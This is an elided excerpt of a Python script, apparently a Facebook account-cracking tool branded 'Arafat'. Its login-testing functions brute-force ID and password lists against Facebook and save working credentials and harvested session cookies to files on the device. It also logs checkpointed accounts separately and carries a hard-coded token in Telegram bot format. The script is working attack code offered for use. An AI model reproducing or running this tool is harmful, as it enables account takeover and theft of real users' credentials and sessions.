...
from os import path
import requests,random,uuid,string,hashlib,json,uuid
from os import path
...
def menu():
        try:
                        ...
                        if xd in ['1','01']:
                                clear();print(f'{B}❲{A}={B}❳{G} EXAMPLE : /sdcard/example.txt ');linex()
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r\r{B}❲{G}𝐍𝐗-𝐀𝐫𝐚𝐟𝐚𝐭{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}𝐀𝐫𝐚𝐟𝐚𝐭-OK{B}❳{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
                                        open('/sdcard/𝐀𝐫𝐚𝐟𝐚𝐭-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}𝐀𝐫𝐚𝐟𝐚𝐭-CP{B}❳{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/𝐀𝐫𝐚𝐟𝐚𝐭-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
                                        open('/sdcard/𝐀𝐫𝐚𝐟𝐚𝐭-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def rndm2(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{G}𝐀𝐫𝐚𝐟𝐚𝐭-M2{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '6675644006:AAE8C6LsKX9JfZ8UfdTv-LvONBUKEv3Sywk'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def rndm3(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{G}𝐀𝐫𝐚𝐟𝐚𝐭-M3{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '6675644006:AAE8C6LsKX9JfZ8UfdTv-LvONBUKEv3Sywk'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
